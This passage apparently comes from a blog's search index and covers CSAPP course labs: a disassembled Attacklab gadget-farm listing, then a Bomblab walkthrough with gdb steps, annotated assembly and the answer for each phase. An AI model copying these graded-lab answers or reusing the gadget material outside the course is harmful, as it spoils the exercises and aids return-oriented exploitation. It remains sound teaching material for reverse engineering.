retq 00000000004019c3 \u003csetval_426\u003e: 4019c3: c7 07 48 89 c7 90 movl $0x90c78948,(%rdi) 4019c9: c3 retq 00000000004019ca \u003cgetval_280\u003e: 4019ca: b8 29 58 90 c3 mov $0xc3905829,%eax 4019cf: c3 retq 00000000004019d0 \u003cmid_farm\u003e: 4019d0: b8 01 00 00 00 mov $0x1,%eax 4019d5: c3 retq 00000000004019d6 \u003cadd_xy\u003e: 4019d6: 48 8d 04 37 lea (%rdi,%rsi,1),%rax 4019da: c3 retq 00000000004019db \u003cgetval_481\u003e: 4019db: b8 5c 89 c2 90 mov $0x90c2895c,%eax 4019e0: c3 retq 00000000004019e1 \u003csetval_296\u003e: 4019e1: c7 07 99 d1 90 90 movl $0x9090d199,(%rdi) 4019e7: c3 retq 00000000004019e8 \u003caddval_113\u003e: 4019e8: 8d 87 89 ce 78 c9 lea -0x36873177(%rdi),%eax 4019ee: c3 retq 00000000004019ef \u003caddval_490\u003e: 4019ef: 8d 87 8d d1 20 db lea -0x24df2e73(%rdi),%eax 4019f5: c3 retq 00000000004019f6 \u003cgetval_226\u003e: 4019f6: b8 89 d1 48 c0 mov $0xc048d189,%eax 4019fb: c3 retq 00000000004019fc \u003csetval_384\u003e: 4019fc: c7 07 81 d1 84 c0 movl $0xc084d181,(%rdi) 401a02: c3 retq 0000000000401a03 \u003caddval_190\u003e: 401a03: 8d 87 41 48 89 e0 lea -0x1f76b7bf(%rdi),%eax 401a09: c3 retq 0000000000401a0a \u003csetval_276\u003e: 401a0a: c7 07 88 c2 08 c9 movl $0xc908c288,(%rdi) 401a10: c3 retq 0000000000401a11 \u003caddval_436\u003e: 401a11: 8d 87 89 ce 90 90 lea -0x6f6f3177(%rdi),%eax 401a17: c3 retq 0000000000401a18 \u003cgetval_345\u003e: 401a18: b8 48 89 e0 c1 mov $0xc1e08948,%eax 401a1d: c3 retq 0000000000401a1e \u003caddval_479\u003e: 401a1e: 8d 87 89 c2 00 c9 lea -0x36ff3d77(%rdi),%eax 401a24: c3 retq 0000000000401a25 \u003caddval_187\u003e: 401a25: 8d 87 89 ce 38 c0 lea -0x3fc73177(%rdi),%eax 401a2b: c3 retq 0000000000401a2c \u003csetval_248\u003e: 401a2c: c7 07 81 ce 08 db movl $0xdb08ce81,(%rdi) 401a32: c3 retq 0000000000401a33 \u003cgetval_159\u003e: 401a33: b8 89 d1 38 c9 mov $0xc938d189,%eax 401a38: c3 retq 0000000000401a39 \u003caddval_110\u003e: 401a39: 8d 87 c8 89 e0 c3 lea -0x3c1f7638(%rdi),%eax 401a3f: c3 retq 0000000000401a40 \u003caddval_487\u003e: 401a40: 8d 87 89 c2 84 c0 lea -0x3f7b3d77(%rdi),%eax 401a46: c3 retq 0000000000401a47 \u003caddval_201\u003e: 401a47: 8d 87 48 89 e0 c7 lea -0x381f76b8(%rdi),%eax 401a4d: c3 retq 0000000000401a4e \u003cgetval_272\u003e: 401a4e: b8 99 d1 08 d2 mov $0xd208d199,%eax 401a53: c3 retq 0000000000401a54 \u003cgetval_155\u003e: 401a54: b8 89 c2 c4 c9 mov $0xc9c4c289,%eax 401a59: c3 retq 0000000000401a5a \u003csetval_299\u003e: 401a5a: c7 07 48 89 e0 91 movl $0x91e08948,(%rdi) 401a60: c3 retq 0000000000401a61 \u003caddval_404\u003e: 401a61: 8d 87 89 ce 92 c3 lea -0x3c6d3177(%rdi),%eax 401a67: c3 retq 0000000000401a68 \u003cgetval_311\u003e: 401a68: b8 89 d1 08 db mov $0xdb08d189,%eax 401a6d: c3 retq 0000000000401a6e \u003csetval_167\u003e: 401a6e: c7 07 89 d1 91 c3 movl $0xc391d189,(%rdi) 401a74: c3 retq 0000000000401a75 \u003csetval_328\u003e: 401a75: c7 07 81 c2 38 d2 movl $0xd238c281,(%rdi) 401a7b: c3 retq 0000000000401a7c \u003csetval_450\u003e: 401a7c: c7 07 09 ce 08 c9 movl $0xc908ce09,(%rdi) 401a82: c3 retq 0000000000401a83 \u003caddval_358\u003e: 401a83: 8d 87 08 89 e0 90 lea -0x6f1f76f8(%rdi),%eax 401a89: c3 retq 0000000000401a8a \u003caddval_124\u003e: 401a8a: 8d 87 89 c2 c7 3c lea 0x3cc7c289(%rdi),%eax 401a90: c3 retq 0000000000401a91 \u003cgetval_169\u003e: 401a91: b8 88 ce 20 c0 mov $0xc020ce88,%eax 401a96: c3 retq 0000000000401a97 \u003csetval_181\u003e: 401a97: c7 07 48 89 e0 c2 movl $0xc2e08948,(%rdi) 401a9d: c3 retq 0000000000401a9e \u003caddval_184\u003e: 401a9e: 8d 87 89 c2 60 d2 lea -0x2d9f3d77(%rdi),%eax 401aa4: c3 retq 0000000000401aa5 \u003cgetval_472\u003e: 401aa5: b8 8d ce 20 d2 mov $0xd2","date":"2023-02-03","objectID":"/posts/csapp/attacklab/:4:3","tags":null,"title":"Attacklab","uri":"/posts/csapp/attacklab/"},{"categories":["csapp"],"content":"Summary Bomblab from CSAPP 15213, including 6 normal phases and 1 extra secret-phase. It’s a little bit hard, please be patient and gradually find your way out, good luck! Source: [https://github.com/yewentao256/CSAPP_15213/tree/main/bomblab] ","date":"2023-02-03","objectID":"/posts/csapp/bomblab/:1:0","tags":null,"title":"Bomblab","uri":"/posts/csapp/bomblab/"},{"categories":["csapp"],"content":"Set up Environment Using a docker container is the simplest way, source from yansongsongsong docker run --privileged -d -p 1221:22 --name bomb yansongsongsong/csapp:bomblab Then using vscode remote ssh to connect with it as we described in datalab password: THEPASSWORDYOUCREATED ","date":"2023-02-03","objectID":"/posts/csapp/bomblab/:2:0","tags":null,"title":"Bomblab","uri":"/posts/csapp/bomblab/"},{"categories":["csapp"],"content":"Commands We usually use gdb -q bomb # start debugging b explode_bomb # help you break before bomb stepi # run into next instruction (stepin) nexti # run into next instruction (not stepin the funcs) disas phase_1 # make binary coding into assembly, helpful x/s 0x402400 # get the string value in address 0x402400 i registers # print the register infos p $rsp # print the value of variable ","date":"2023-02-03","objectID":"/posts/csapp/bomblab/:3:0","tags":null,"title":"Bomblab","uri":"/posts/csapp/bomblab/"},{"categories":["csapp"],"content":"Phase_1 assembler code for function phase_1: 0x000400ee0 \u003c+0\u003e: sub $0x8,%rsp 0x000400ee4 \u003c+4\u003e: mov $0x402400,%esi // move 0x402400 to %esi 0x000400ee9 \u003c+9\u003e: callq 0x401338 \u003cstrings_not_equal\u003e 0x000400eee \u003c+14\u003e: test %eax,%eax // judge if eax == 1 0x000400ef0 \u003c+16\u003e: je 0x400ef7 \u003cphase_1+23\u003e // jump if equal/zero 0x000400ef2 \u003c+18\u003e: callq 0x40143a \u003cexplode_bomb\u003e 0x000400ef7 \u003c+23\u003e: add $0x8,%rsp 0x000400efb \u003c+27\u003e: retq strings_not_equal compares two strings in register %rdi, %rsi, then saves 0 in %rax if they are same, 1 otherwise. If you are interested, disas strings_not_equal for more details. So this phase is to compare the strings, if they are not the same, bomb. So we can use x/s 0x402400 to see the string, that is the answer. (gdb) x/s 0x402400 0x402400: \"Border relations with Canada have never been better.\" ","date":"2023-02-03","objectID":"/posts/csapp/bomblab/:4:0","tags":null,"title":"Bomblab","uri":"/posts/csapp/bomblab/"},{"categories":["csapp"],"content":"Phase_2 Dump of assembler code for function phase_2: 0x00400efc \u003c+0\u003e: push %rbp 0x00400efd \u003c+1\u003e: push %rbx 0x00400efe \u003c+2\u003e: sub $0x28,%rsp 0x00400f02 \u003c+6\u003e: mov %rsp,%rsi 0x00400f05 \u003c+9\u003e: callq 0x40145c \u003cread_six_numbers\u003e // considering read_six_numbers a black box // after calling this, we find that (%rsp) is the first element we input // so here we know the first element must be number 1 // what's more, by using `x/8w $rsp` we know the number's relation with rsp // eg: we input 1 2 3 4 5 6, so // x/8w $rsp // 0x7fffffffe1d0: 0x00000001 0x00000002 0x00000003 0x00000004 // 0x7fffffffe1e0: 0x00000005 0x00000006 0x00401431 0x 0x00400f0a \u003c+14\u003e: cmpl $0x1,(%rsp) 0x00400f0e \u003c+18\u003e: je 0x400f30 \u003cphase_2+52\u003e // jump if (%rsp) == 1 0x00400f10 \u003c+20\u003e: callq 0x40143a \u003cexplode_bomb\u003e ---------------------------------------------------------- 0x00400f15 \u003c+25\u003e: jmp 0x400f30 \u003cphase_2+52\u003e 0x00400f17 \u003c+27\u003e: mov -0x4(%rbx),%eax 0x00400f1a \u003c+30\u003e: add %eax,%eax 0x00400f1c \u003c+32\u003e: cmp %eax,(%rbx) // here (%rbx) should equal to the 2 * -0x4(%rbx) // rbx = rsp + 0x4 when first here // then(second, third ...), rbx = rbx + 0x4 0x00400f1e \u003c+34\u003e: je 0x400f25 \u003cphase_2+41\u003e 0x00400f20 \u003c+36\u003e: callq 0x40143a \u003cexplode_bomb\u003e 0x00400f25 \u003c+41\u003e: add $0x4,%rbx 0x00400f29 \u003c+45\u003e: cmp %rbp,%rbx // here is a loop, if rbx == rbp(rsp + 0x18), then quit // else go to the phase_2 + 27 again 0x00400f2c \u003c+48\u003e: jne 0x400f17 \u003cphase_2+27\u003e 0x00400f2e \u003c+50\u003e: jmp 0x400f3c \u003cphase_2+64\u003e 0x00400f30 \u003c+52\u003e: lea 0x4(%rsp),%rbx 0x00400f35 \u003c+57\u003e: lea 0x18(%rsp),%rbp 0x00400f3a \u003c+62\u003e: jmp 0x400f17 \u003cphase_2+27\u003e 0x00400f3c \u003c+64\u003e: add $0x28,%rsp 0x00400f40 \u003c+68\u003e: pop %rbx 0x00400f41 \u003c+69\u003e: pop %rbp 0x00400f42 \u003c+70\u003e: retq Dump of assembler code for function read_six_numbers: 0x0040145c \u003c+0\u003e: sub $0x18,%rsp 0x00401460 \u003c+4\u003e: mov %rsi,%rdx 0x00401463 \u003c+7\u003e: lea 0x4(%rsi),%rcx 0x00401467 \u003c+11\u003e: lea 0x14(%rsi),%rax 0x0040146b \u003c+15\u003e: mov %rax,0x8(%rsp) 0x00401470 \u003c+20\u003e: lea 0x10(%rsi),%rax 0x00401474 \u003c+24\u003e: mov %rax,(%rsp) 0x00401478 \u003c+28\u003e: lea 0xc(%rsi),%r9 0x0040147c \u003c+32\u003e: lea 0x8(%rsi),%r8 0x00401480 \u003c+36\u003e: mov $0x4025c3,%esi 0x00401485 \u003c+41\u003e: mov $0x0,%eax 0x0040148a \u003c+46\u003e: callq 0x400bf0 \u003c__isoc99_sscanf@plt\u003e // Consider scanf is a black box // after calling scanf, we find that eax = the number of element we input // so here we know we should input more than 5 numbers 0x0040148f \u003c+51\u003e: cmp $0x5,%eax 0x00401492 \u003c+54\u003e: jg 0x401499 \u003cread_six_numbers+61\u003e // jump if eax \u003e 5 0x00401494 \u003c+56\u003e: callq 0x40143a \u003cexplode_bomb\u003e 0x00401499 \u003c+61\u003e: add $0x18,%rsp 0x0040149d \u003c+65\u003e: retq Carefully read all of the codes above, we can know: we should input more than five numbers the first number should be 1 numbers[i+i] = numbers[i] * 2 So we get the answer: 1 2 4 8 16 32 You can also type lots of numbers, that doesn’t matter: 1 2 4 8 16 32 64 ... ","date":"2023-02-03","objectID":"/posts/csapp/bomblab/:5:0","tags":null,"title":"Bomblab","uri":"/posts/csapp/bomblab/"},{"categories":["csapp"],"content":"Phase_3 Dump of assembler code for function phase_3: 0x00400f43 \u003c+0\u003e: sub $0x18,%rsp 0x00400f47 \u003c+4\u003e: lea 0xc(%rsp),%rcx 0x00400f4c \u003c+9\u003e: lea 0x8(%rsp),%rdx // move $0x4025cf to the second argument of sscanf // by `x/s 0x4025cf` we get \"%d %d\", so here we know we should input 2 numbers 0x00400f51 \u003c+14\u003e: mov $0x4025cf,%esi 0x00400f56 \u003c+19\u003e: mov $0x0,%eax 0x00400f5b \u003c+24\u003e: callq 0x400bf0 \u003c__isoc99_sscanf@plt\u003e // according to phase_2, we know %eax is the number of elements we input // so we should type more than 1 element, which also validates the %d %d above // what's more, if you command `x/4w $rsp`, you'll find the elements you input // at 0x8(%rsp), 0xc(%rsp) 0x00400f60 \u003c+29\u003e: cmp $0x1,%eax 0x00400f63 \u003c+32\u003e: jg 0x400f6a \u003cphase_3+39\u003e 0x00400f65 \u003c+34\u003e: callq 0x40143a \u003cexplode_bomb\u003e // here the first element should not big than 7 0x00400f6a \u003c+39\u003e: cmpl $0x7,0x8(%rsp) 0x00400f6f \u003c+44\u003e: ja 0x400fad \u003cphase_3+106\u003e --------------------------------------------------------------- 0x00400f71 \u003c+46\u003e: mov 0x8(%rsp),%eax // calculate address = 8 * rax + 0x402470, then get the value saved in address // then jump to the value address, usually used in switch table // 8 means 8 bytes a unit, so we can use `x/8xg 0x402470` to see the table // 0x402470: 0x00400f7c 0x00400fb9 // 0x402480: 0x00400f83 0x00400f8a // 0x402490: 0x00400f91 0x00400f98 // 0x4024a0: 0x00400f9f 0x00400fa6 // so we know the first number we input is used to get to the different branch 0x00400f75 \u003c+50\u003e: jmpq *0x402470(,%rax,8) 0x00400f7c \u003c+57\u003e: mov $0xcf,%eax // eax = 207 0x00400f81 \u003c+62\u003e: jmp 0x400fbe \u003cphase_3+123\u003e 0x00400f83 \u003c+64\u003e: mov $0x2c3,%eax // eax = 707 0x00400f88 \u003c+69\u003e: jmp 0x400fbe \u003cphase_3+123\u003e 0x00400f8a \u003c+71\u003e: mov $0x100,%eax // eax = 256 0x00400f8f \u003c+76\u003e: jmp 0x400fbe \u003cphase_3+123\u003e 0x00400f91 \u003c+78\u003e: mov $0x185,%eax // eax = 389 0x00400f96 \u003c+83\u003e: jmp 0x400fbe \u003cphase_3+123\u003e 0x00400f98 \u003c+85\u003e: mov $0xce,%eax // eax = 206 0x00400f9d \u003c+90\u003e: jmp 0x400fbe \u003cphase_3+123\u003e 0x00400f9f \u003c+92\u003e: mov $0x2aa,%eax // eax = 682 0x00400fa4 \u003c+97\u003e: jmp 0x400fbe \u003cphase_3+123\u003e 0x00400fa6 \u003c+99\u003e: mov $0x147,%eax // eax = 327 0x00400fab \u003c+104\u003e: jmp 0x400fbe \u003cphase_3+123\u003e 0x00400fad \u003c+106\u003e: callq 0x40143a \u003cexplode_bomb\u003e 0x00400fb2 \u003c+111\u003e: mov $0x0,%eax 0x00400fb7 \u003c+116\u003e: jmp 0x400fbe \u003cphase_3+123\u003e 0x00400fb9 \u003c+118\u003e: mov $0x137,%eax // eax = 311 // here we compare the second number we input with %eax // they should be the same 0x00400fbe \u003c+123\u003e: cmp 0xc(%rsp),%eax 0x00400fc2 \u003c+127\u003e: je 0x400fc9 \u003cphase_3+134\u003e 0x00400fc4 \u003c+129\u003e: callq 0x40143a \u003cexplode_bomb\u003e 0x00400fc9 \u003c+134\u003e: add $0x18,%rsp 0x00400fcd \u003c+138\u003e: retq Read all of the codes and comments carefully above, we know: we should input two numbers the first number is used to goto different branches the second number should be the same with the value in different branches So we get the answer, pick one of them: 0 207 1 311 2 707 3 256 4 389 5 206 6 682 7 327 ","date":"2023-02-03","objectID":"/posts/csapp/bomblab/:6:0","tags":null,"title":"Bomblab","uri":"/posts/csapp/bomblab/"},{"categories":["csapp"],"content":"phase_4 Dump of assembler code for function phase_4: 0x0040100c \u003c+0\u003e: sub $0x18,%rsp 0x00401010 \u003c+4\u003e: lea 0xc(%rsp),%rcx 0x00401015 \u003c+9\u003e: lea 0x8(%rsp),%rdx 0x0040101a \u003c+14\u003e: mov $0x4025cf,%esi // \"%d %d\", two numbers 0x0040101f \u003c+19\u003e: mov $0x0,%eax 0x00401024 \u003c+24\u003e: callq 0x400bf0 \u003c__isoc99_sscanf@plt\u003e 0x00401029 \u003c+29\u003e: cmp $0x2,%eax // validates two numbers 0x0040102c \u003c+32\u003e: jne 0x401035 \u003cphase_4+41\u003e // Note: 0x8(%rsp) is the first number, 0xc(%rsp) is the second // here the first number(unsigned) should not big than 0xe 0x0040102e \u003c+34\u003e: cmpl $0xe,0x8(%rsp) 0x00401033 \u003c+39\u003e: jbe 0x40103a \u003cphase_4+46\u003e // below or equal(unsigned) 0x00401035 \u003c+41\u003e: callq 0x40143a \u003cexplode_bomb\u003e 0x0040103a \u003c+46\u003e: mov $0xe,%edx // third arg = 14 0x0040103f \u003c+51\u003e: mov $0x0,%esi // second arg = 0 0x00401044 \u003c+56\u003e: mov 0x8(%rsp),%edi // first arg = first n we input 0x00401048 \u003c+60\u003e: callq 0x400fce \u003cfunc4\u003e // here the return number should be 0, or it will boom 0x0040104d \u003c+65\u003e: test %eax,%eax 0x0040104f \u003c+67\u003e: jne 0x401058 \u003cphase_4+76\u003e // here we know the second number should be zero 0x00401051 \u003c+69\u003e: cmpl $0x0,0xc(%rsp) 0x00401056 \u003c+74\u003e: je 0x40105d \u003cphase_4+81\u003e 0x00401058 \u003c+76\u003e: callq 0x40143a \u003cexplode_bomb\u003e 0x0040105d \u003c+81\u003e: add $0x18,%rsp 0x00401061 \u003c+85\u003e: retq Dump of assembler code for function func4: 0x00400fce \u003c+0\u003e: sub $0x8,%rsp 0x00400fd2 \u003c+4\u003e: mov %edx,%eax 0x00400fd4 \u003c+6\u003e: sub %esi,%eax 0x00400fd6 \u003c+8\u003e: mov %eax,%ecx 0x00400fd8 \u003c+10\u003e: shr $0x1f,%ecx // shift logical right 31 0x00400fdb \u003c+13\u003e: add %ecx,%eax 0x00400fdd \u003c+15\u003e: sar %eax // shift arithmetic right, default 1 0x00400fdf \u003c+17\u003e: lea (%rax,%rsi,1),%ecx 0x00400fe2 \u003c+20\u003e: cmp %edi,%ecx 0x00400fe4 \u003c+22\u003e: jle 0x400ff2 \u003cfunc4+36\u003e 0x00400fe6 \u003c+24\u003e: lea -0x1(%rcx),%edx 0x00400fe9 \u003c+27\u003e: callq 0x400fce \u003cfunc4\u003e 0x00400fee \u003c+32\u003e: add %eax,%eax 0x00400ff0 \u003c+34\u003e: jmp 0x401007 \u003cfunc4+57\u003e 0x00400ff2 \u003c+36\u003e: mov $0x0,%eax 0x00400ff7 \u003c+41\u003e: cmp %edi,%ecx 0x00400ff9 \u003c+43\u003e: jge 0x401007 \u003cfunc4+57\u003e 0x00400ffb \u003c+45\u003e: lea 0x1(%rcx),%esi 0x00400ffe \u003c+48\u003e: callq 0x400fce \u003cfunc4\u003e 0x00401003 \u003c+53\u003e: lea 0x1(%rax,%rax,1),%eax 0x00401007 \u003c+57\u003e: add $0x8,%rsp 0x0040100b \u003c+61\u003e: retq It’s too complicated, so we translate the func4 to python: # x = edi = first n we input # esi = 0 at first, edx = 14 at first def func4(x: int = 0, esi: int = 0, edx: int = 14) -\u003e int: result = edx - esi ecx = result \u003e\u003e 31 result = (result + ecx) \u003e\u003e 1 ecx = result + esi if ecx \u003c= x: result = 0 if ecx \u003e= x: return result else: # should not entering here! the returning number can't be 0 any more # if x \u003e 7, the program will be here result = func4(x=x, esi=ecx+1, edx=edx) return 2*result + 1 else: result = func4(x=x, esi=esi, edx=ecx-1) return 2*result Read all of the codes and comments above carefully, we know: we should input two numbers, the first one should not big than 14 the second number should be zero The result of func4 must be zero if x \u003e 7, the recursive function returns a non-zero number, boom! we can easily find that if x == 7, the func4 directly return 0 What’s more, we can try cases from 0 to 7, and get the answers(pick one of them): 0 0 1 0 3 0 7 0 ","date":"2023-02-03","objectID":"/posts/csapp/bomblab/:7:0","tags":null,"title":"Bomblab","uri":"/posts/csapp/bomblab/"},{"categories":["csapp"],"content":"phase_5(doing) Dump of assembler code for function phase_5: 0x00401062 \u003c+0\u003e: push %rbx 0x00401063 \u003c+1\u003e: sub $0x20,%rsp 0x00401067 \u003c+5\u003e: mov %rdi,%rbx // Canary usage: save %fs:0x28 to 0x18(%rsp) at the beginning // then xor the 0x18(%rsp) at the end to see if someone attacks the program 0x0040106a \u003c+8\u003e: mov %fs:0x28,%rax 0x00401073 \u003c+17\u003e: mov %rax,0x18(%rsp) 0x00401078 \u003c+22\u003e: xor %eax,%eax // eax xor eax = 0 // `string_length` returns the number of characters in a string // the string pointer is passed through %rdi (the content you input before) // to see your string, type `x/s $rdi` // if you are interested, `disas string_length` for more details // you will also find how `\\0` works at the end of a string 0x0040107a \u003c+24\u003e: callq 0x40131b \u003cstring_length\u003e // so here we know we should input 6 characters 0x0040107f \u003c+29\u003e: cmp $0x6,%eax 0x00401082 \u003c+32\u003e: je 0x4010d2 \u003cphase_5+112\u003e //jump if %eax==6 0x00401084 \u003c+34\u003e: callq 0x40143a \u003cexplode_bomb\u003e 0x00401089 \u003c+39\u003e: jmp 0x4010d2 \u003cphase_5+112\u003e ---------------------------------------------------------- // Note: rbx is the rdi, namely the element we input before // movzbl: move byte to long (zero expanding) // this means whatever we input, we only use the final byte--according to ascii // eg: we input \"iasdfg\", at first we'll get 105(ascii of character `i`) 0x0040108b \u003c+41\u003e: movzbl (%rbx,%rax,1),%ecx 0x0040108f \u003c+45\u003e: mov %cl,(%rsp) // cl is the last byte of %rcx 0x00401092 \u003c+48\u003e: mov (%rsp),%rdx 0x00401096 \u003c+52\u003e: and $0xf,%edx // get the last 4 bits of %edx(%cl) // x/s 0x4024b0 and get // \"maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?\" // here we use te last 4 bits of %cl, adding 0x4024b0 to get the new character // eg: character `i` gets 9 (105 = 0110 1001, last 4 bits is 9) // then we get the 9th character of the string above, which is `f`(ascii: 102) 0x00401099 \u003c+55\u003e: movzbl 0x4024b0(%rdx),%edx 0x004010a0 \u003c+62\u003e: mov %dl,0x10(%rsp,%rax,1) // value saved in $rsp 0x004010a4 \u003c+66\u003e: add $0x1,%rax 0x004010a8 \u003c+70\u003e: cmp $0x6,%rax 0x004010ac \u003c+74\u003e: jne 0x40108b \u003cphase_5+41\u003e // jump if %rax!=6, loop 0x004010ae \u003c+76\u003e: movb $0x0,0x16(%rsp) 0x004010b3 \u003c+81\u003e: mov $0x40245e,%esi 0x004010b8 \u003c+86\u003e: lea 0x10(%rsp),%rdi // `x/s 0x40245e` we gets \"flyers\", then saved in `%esi` // `strings_not_equal` compare two strings in `%edi` and `%esi` // return 0 if two strings are the same // `disas strings_not_equal` for more details 0x004010bd \u003c+91\u003e: callq 0x401338 \u003cstrings_not_equal\u003e // So here the string saved in 0x10(%rsp) should be the same with \"flyers\" // the index of them in \"maduiersnfotvbyl...\" is `9 15 14 5 6 7` // so we should input 6 characters, the last 4 bits of which should be the values 0x004010c2 \u003c+96\u003e: test %eax,%eax 0x004010c4 \u003c+98\u003e: je 0x4010d9 \u003cphase_5+119\u003e 0x004010c6 \u003c+100\u003e: callq 0x40143a \u003cexplode_bomb\u003e 0x004010cb \u003c+105\u003e: nopl 0x0(%rax,%rax,1) 0x004010d0 \u003c+110\u003e: jmp 0x4010d9 \u003cphase_5+119\u003e ------------------------------------------------------- 0x004010d2 \u003c+112\u003e: mov $0x0,%eax 0x004010d7 \u003c+117\u003e: jmp 0x40108b \u003cphase_5+41\u003e 0x004010d9 \u003c+119\u003e: mov 0x18(%rsp),%rax // Canary to make sure 0x18(%rsp) is safe, since we only input 6 characters // Here can be always safe 0x004010de \u003c+124\u003e: xor %fs:0x28,%rax 0x004010e7 \u003c+133\u003e: je 0x4010ee \u003cphase_5+140\u003e 0x004010e9 \u003c+135\u003e: callq 0x400b30 \u003c__stack_chk_fail@plt\u003e 0x004010ee \u003c+140\u003e: add $0x20,%rsp 0x004010f2 \u003c+144\u003e: pop %rbx 0x004010f3 \u003c+145\u003e: retq Read all of the codes and coments above carefully, we know: we should input 6 characters the last 4 bits of which (ascii) should be the 9 15 14 5 6 7 So we can easily get one of the answer: ionefg ","date":"2023-02-03","objectID":"/posts/csapp/bomblab/:8:0","tags":null,"title":"Bomblab","uri":"/posts/csapp/bomblab/"},{"categories":["csapp"],"content":"Phase_6 Dump of assembler code for function phase_6: // callee saved registers, make sure do not affect the real value 0x004010f4 \u003c+0\u003e: push %r14 0x004010f6 \u003c+2\u003e: push %r13 0x004010f8 \u003c+4\u003e: push %r12 0x004010fa \u003c+6\u003e: push %rbp 0x004010fb \u003c+7\u003e: push %rbx 0x004010fc \u003c+8\u003e: sub $0x50,%rsp 0x00401100 \u003c+12\u003e: mov %rsp,%r13 0x00401103 \u003c+15\u003e: mov %rsp,%rsi // As we know before, after calling this, (%rsp) is the first number we input // then following the other numbers we input, 4 bytes each 0x00401106 \u003c+18\u003e: callq 0x40145c \u003cread_six_numbers\u003e 0x0040110b \u003c+23\u003e: mov %rsp,%r14 0x0040110e \u003c+26\u003e: mov $0x0,%r12d 0x00401114 \u003c+32\u003e: mov %r13,%rbp // since we move address %rsp to %r13 before, here they have the same value // key: so the first number we input should small than 6 (unsignded) // What's more, when loop back, we'll check the second, the third... // Then all of the numbers should be small than 6 0x00401117 \u003c+35\u003e: mov 0x0(%r13),%eax 0x0040111b \u003c+39\u003e: sub $0x1,%eax 0x0040111e \u003c+42\u003e: cmp $0x5,%eax 0x00401121 \u003c+45\u003e: jbe 0x401128 \u003cphase_6+52\u003e 0x00401123 \u003c+47\u003e: callq 0x40143a \u003cexplode_bomb\u003e ---------------------------------------------------------- // a loop here, same with `for(int r12d = 0, r12d \u003c 6, r12d++)` 0x00401128 \u003c+52\u003e: add $0x1,%r12d 0x0040112c \u003c+56\u003e: cmp $0x6,%r12d // when all the numbers checked: small than 6, we jump to +95 0x00401130 \u003c+60\u003e: je 0x401153 \u003cphase_6+95\u003e 0x00401132 \u003c+62\u003e: mov %r12d,%ebx 0x00401135 \u003c+65\u003e: movslq %ebx,%rax // `movslq`: move 4 bytes to 8 bytes(signed expanding) // here we get the value we input (%rsp + 4 * %rax) // and it should be different with %rbp(the former value we input, 0 at first) 0x00401138 \u003c+68\u003e: mov (%rsp,%rax,4),%eax 0x0040113b \u003c+71\u003e: cmp %eax,0x0(%rbp) 0x0040113e \u003c+74\u003e: jne 0x401145 \u003cphase_6+81\u003e // jump if not zero 0x00401140 \u003c+76\u003e: callq 0x40143a \u003cexplode_bomb\u003e 0x00401145 \u003c+81\u003e: add $0x1,%ebx 0x00401148 \u003c+84\u003e: cmp $0x5,%ebx 0x0040114b \u003c+87\u003e: jle 0x401135 \u003cphase_6+65\u003e // loop back // after this loop, all of the values are checked: not zero // and after adding 0x4, `%r13` now starts with the next value we input // eg: we input 1 2 3 4 5 6, and after first loop here, it is `2 3 4 5 6` 0x0040114d \u003c+89\u003e: add $0x4,%r13 0x00401151 \u003c+93\u003e: jmp 0x401114 \u003cphase_6+32\u003e ----------------------------------------------------- // here is a loop again: save 0x18(%rsp) to %rsi // whatever %rsi it is, we'll loop through all of the values we input // then make the number we input = 7 - the number we input // eg: we input 1 2 3 4 5 6, then it will be `6 5 4 3 2 1` 0x00401153 \u003c+95\u003e: lea 0x18(%rsp),%rsi 0x00401158 \u003c+100\u003e: mov %r14,%rax // rax = the numbers we input now 0x0040115b \u003c+103\u003e: mov $0x7,%ecx 0x00401160 \u003c+108\u003e: mov %ecx,%edx 0x00401162 \u003c+110\u003e: sub (%rax),%edx // edx = 7 - the number we input 0x00401164 \u003c+112\u003e: mov %edx,(%rax) 0x00401166 \u003c+114\u003e: add $0x4,%rax // make the pointer plus 4 0x0040116a \u003c+118\u003e: cmp %rsi,%rax 0x0040116d \u003c+121\u003e: jne 0x401160 \u003cphase_6+108\u003e --------------------------------------------------------- 0x0040116f \u003c+123\u003e: mov $0x0,%esi 0x00401174 \u003c+128\u003e: jmp 0x401197 \u003cphase_6+163\u003e // %rdx is the node array, when plus 0x8, it moves to the next node // when %ecx(7 - the number we input) matches, end the loop, // then save the address to `0x20(%rsp,%rsi,2)` by index // eg: %ecx = 6, it will keep going and saved the sixth node(0x603320) // if %ecx = 1, it will just end and saved the second node(0x6032e0) 0x00401176 \u003c+130\u003e: mov 0x8(%rdx),%rdx 0x0040117a \u003c+134\u003e: add $0x1,%eax 0x0040117d \u003c+137\u003e: cmp %ecx,%eax 0x0040117f \u003c+139\u003e: jne 0x401176 \u003cphase_6+130\u003e 0x00401181 \u003c+141\u003e: jmp 0x401188 \u003cphase_6+148\u003e 0x00401183 \u003c+143\u003e: mov $0x6032d0,%edx /* 0x6032d0 \u003cnode1\u003e: 0x0000014c 0x00000001 0x006032e0 0x 0x6032e0 \u003cnode2\u003e: 0x000000a8 0x00000002 0x006032f0 0x 0x6032f0 \u003cnode3\u003e: 0x0000039c 0x00000003 0x00603300 0x 0x603300 \u003cnode4\u003e: 0x000002b3 0x00000004 0x00603310 0x 0x603310 \u003cnode5\u003e: 0x000001dd 0x00000005 0x00603320 0x 0x603320 \u003cnode6\u003e: 0x000001bb 0x00000006 0x 0x */ 0x00401188 \u003c+148\u003e: mov %rdx,0x20(%rsp,%rsi,","date":"2023-02-03","objectID":"/posts/csapp/bomblab/:9:0","tags":null,"title":"Bomblab","uri":"/posts/csapp/bomblab/"},{"categories":["csapp"],"content":"Seems to be the end? secret_phase Haha, secret_phase is waiting for you! By objdump -d bomb \u003e bomb.asm, we can get lots of codes, one thing that is: 00401242 \u003csecret_phase\u003e: 401242: 53 push %rbx .... 401292: c3 retq Let’s see how to enter the secret_phase 004015c4 \u003cphase_defused\u003e: ... 401630: e8 0d fc ff ff callq 401242 \u003csecret_phase\u003e each time when we call for phase_defused, it may enter the secret_phase! Dump of assembler code for function phase_defused: 0x004015c4 \u003c+0\u003e: sub $0x78,%rsp 0x004015c8 \u003c+4\u003e: mov %fs:0x28,%rax 0x004015d1 \u003c+13\u003e: mov %rax,0x68(%rsp) // protect 0x68(%rsp) by Canary 0x004015d6 \u003c+18\u003e: xor %eax,%eax 0x004015d8 \u003c+20\u003e: cmpl $0x6,0x202181(%rip) # 0x603760 \u003cnum_input_strings\u003e // here 0x202181(%rip) gets the value of 0x603760 // this variable stores the number of strings we've input // so after 6 phases, we may enter the secret phase 0x004015df \u003c+27\u003e: jne 0x40163f \u003cphase_defused+123\u003e 0x004015e1 \u003c+29\u003e: lea 0x10(%rsp),%r8 